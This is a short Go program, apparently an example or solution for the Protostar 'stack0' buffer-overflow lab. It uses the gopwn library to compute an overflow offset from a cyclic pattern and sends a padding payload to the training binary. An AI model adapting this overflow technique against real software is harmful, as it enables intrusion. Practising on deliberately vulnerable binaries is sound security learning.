package main

import (
	"bytes"
	"fmt"

	"github.com/hupe1980/gopwn"
)

func main() {
	pattern := gopwn.Cyclic(200)
	fmt.Printf("Pattern: %s\n", pattern)

	crashPattern := "vaaa"
	fmt.Printf("CrashPattern: %s\n", crashPattern)

	bufferSize := gopwn.CyclicFind([]byte(crashPattern))
	fmt.Printf("Buffer size: %d\n", bufferSize)
	payload := bytes.Repeat([]byte("A"), bufferSize-6)

	p := gopwn.Process([]string{"/opt/protostar/bin/64stack0"})
	if _, err := p.SendLine(payload); err != nil {
		panic(err)
	}

	out, err := p.RecvLine()
	if err != nil {
		panic(err)
	}
	fmt.Println(string(out))
}
